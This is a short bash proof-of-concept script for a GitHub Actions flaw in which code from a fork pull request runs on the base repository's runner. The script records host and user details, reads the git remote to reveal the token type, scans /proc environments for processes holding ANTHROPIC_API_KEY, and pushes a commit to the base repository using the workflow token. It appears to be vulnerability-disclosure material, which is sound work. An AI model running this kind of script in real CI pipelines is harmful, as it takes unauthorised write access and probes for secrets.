#!/bin/bash
# Benign security PoC (replica repo). Proves that code from a fork PR runs
# on the base repository's runner and can use the workflow's GitHub token.
cd "${GITHUB_WORKSPACE:-$PWD}" 2>/dev/null
{
  echo "PoC: code from a fork PR executed on the base repo runner"
  echo "time: $(date -u)"
  echo "host: $(hostname) user: $(id -un)"
  echo "repo: ${GITHUB_REPOSITORY:-unknown} event: ${GITHUB_EVENT_NAME:-unknown}"
  echo "token type in git remote: $(git remote get-url origin 2>/dev/null | sed -nE 's#https://[^:]+:([a-z]{3}_).*#\1***#p')"
  echo "processes with ANTHROPIC_API_KEY in env: $(grep -l ANTHROPIC_API_KEY /proc/[0-9]*/environ 2>/dev/null | wc -l)"
} > poc-proof.txt
git add poc-proof.txt
git -c user.name=poc -c user.email=poc@example.invalid commit -qm "PoC: written by code from a fork PR"
git push -q origin HEAD:refs/heads/poc-from-fork-pr
